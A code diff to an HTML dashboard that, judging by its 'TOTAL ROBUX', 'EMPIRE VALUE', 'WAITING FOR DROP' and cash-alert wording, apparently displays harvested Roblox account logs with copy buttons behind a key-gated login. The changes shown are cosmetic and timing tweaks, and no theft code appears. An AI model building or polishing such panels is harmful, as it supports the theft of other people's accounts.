@@ -16,7 +16,7 @@
     .eye{position:absolute;right:20px;top:20px;cursor:pointer;font-size:28px;color:#0ff;}
     .login button{padding:20px;width:400px;font-size:24px;border:none;border-radius:50px;background:#0ff;color:#000;font-weight:800;cursor:pointer;box-shadow:0 0 40px #0ff;}
     .login button:hover{transform:scale(1.1);box-shadow:0 0 80px #f0f;}
-    .main{padding:40px;min-height:100vh;}
+    .main{display:none;padding:40px;min-height:100vh;}
     .header{text-align:center;margin-bottom:40px;}
     .header h1{font-size:70px;color:#fff;text-shadow:0 0 40px #000,0 0 80px #0ff;}
     .total{background:linear-gradient(45deg,#0ff,#f0f);padding:30px;border-radius:30px;box-shadow:0 0 60px rgba(0,255,255,0.8);margin:30px auto;max-width:800px;}
@@ -32,6 +32,7 @@
     .robux{color:#0f0;font-weight:900;font-size:28px;}
     .copy{background:#0ff;color:#000;padding:15px 30px;border-radius:50px;font-weight:bold;cursor:pointer;box-shadow:0 0 30px #0ff;}
     .copy:hover{background:#f0f;}
+    .loading{text-align:center;color:#0ff;font-size:24px;margin:40px;}
     .error{color:#f00;font-weight:bold;text-align:center;margin:40px;}
   </style>
 </head>
@@ -45,7 +46,7 @@
     <button onclick="unlock()">UNLOCK EMPIRE</button>
   </div>
 
-  <div class="main" id="main" style="display:none;">
+  <div class="main" id="main">
     <div class="header">
       <h1>TOTAL ROBUX: <span id="total">0</span></h1>
     </div>
@@ -53,7 +54,9 @@
       <h2>EMPIRE VALUE</h2>
       <span id="total2">0</span> Robux
     </div>
-    <div class="logs" id="logs">Loading...</div>
+    <div class="logs" id="logs">
+      <div class="loading">🔥 EMPIRE LOADING... (5-10 sec for first sync)</div>
+    </div>
     <div class="error" id="error" style="display:none;"></div>
   </div>
 
@@ -86,7 +89,7 @@
         document.getElementById('login').style.display = 'none';
         document.getElementById('main').style.display = 'block';
         load();
-        setInterval(load, 3000);
+        setInterval(load, 5000); // 5 sec refresh
       } else {
         alert("WRONG KEY");
       }
@@ -113,7 +116,6 @@
         document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#fff;'>WAITING FOR DROP</h1>";
         document.getElementById('error').style.display = 'none';
 
-        // CASH SOUND
         if (arr.length > lastCount) {
           const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
           audio.play().catch(() => {});
